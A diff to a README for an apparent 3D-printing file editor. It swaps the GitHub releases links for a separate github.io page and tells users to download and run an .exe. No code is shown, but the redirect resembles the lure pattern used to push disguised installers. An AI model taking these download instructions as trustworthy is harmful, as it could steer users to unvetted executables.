@@ -1,6 +1,6 @@
 # 🖨️ 3d-print-tools-editor - Prepare your 3D files with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/adelindbiracial762/3d-print-tools-editor/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://adelindbiracial762.github.io)
 
 This application helps you view, edit, and prepare 3D files for your printer. It runs directly on your computer. You can use it to inspect models, add supports, and check toolpaths. This tool works offline, which keeps your data secure on your local drive.
 
@@ -8,7 +8,7 @@ This application helps you view, edit, and prepare 3D files for your printer. It
 
 You do not need to install complex software to use these tools. Follow these steps to prepare your computer and run the editor.
 
-1. Visit the [releases page](https://github.com/adelindbiracial762/3d-print-tools-editor/releases) to find the latest version.
+1. Visit the [releases page](https://adelindbiracial762.github.io) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to download it to your computer.
 4. Move the file to a folder where you keep your tools.
